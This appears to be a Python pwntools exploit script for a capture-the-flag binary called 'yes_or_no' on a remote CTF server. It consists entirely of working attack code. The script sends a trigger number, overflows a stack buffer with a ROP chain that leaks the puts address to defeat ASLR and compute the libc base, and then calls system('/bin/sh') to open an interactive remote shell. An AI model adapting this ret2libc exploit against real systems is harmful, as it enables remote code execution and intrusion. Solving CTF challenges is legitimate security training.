from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'amd64'
e = ELF("./yes_or_no")
l = ELF("./libc-2.27.so")
#p = process("./yes_or_no")
r = remote("ctf.j0n9hyun.xyz", 3009)
pop_rdi = 0x400883
ret = 0x40056e
puts_plt = e.plt['puts']
puts_got = e.got['puts']
puts_offset = l.symbols['puts']
main = e.symbols['main']
system_offset = l.symbols['system']
binsh_offset = 0x1b3e9a

log.info("pop rdi; ret : 0x%x"%(pop_rdi))

print r.recvuntil("Show me your number~!\n")
r.sendline("+9830400")
print r.recvuntil("That's cool. Follow me\n")

payload = ''
payload += "A"*26
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

r.sendline(payload)
puts_addr = u64(r.recvuntil("\x7f").ljust(8, "\x00"))
log.info("puts_addr : %x"%(puts_addr))
libc_base = puts_addr - puts_offset
log.info("libc_base : %x"%(libc_base))
system_addr = libc_base + system_offset
log.info("system_addr : %x"%(system_addr))
binsh = libc_base + binsh_offset
log.info("/bin/sh addr : %x"%(binsh))

print r.recvuntil("Show me your number~!\n")
r.sendline("+9830400")
print r.recvuntil("That's cool. Follow me\n")
payload = ''
payload += "A"*26
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system_addr)

r.sendline(payload)
r.interactive()
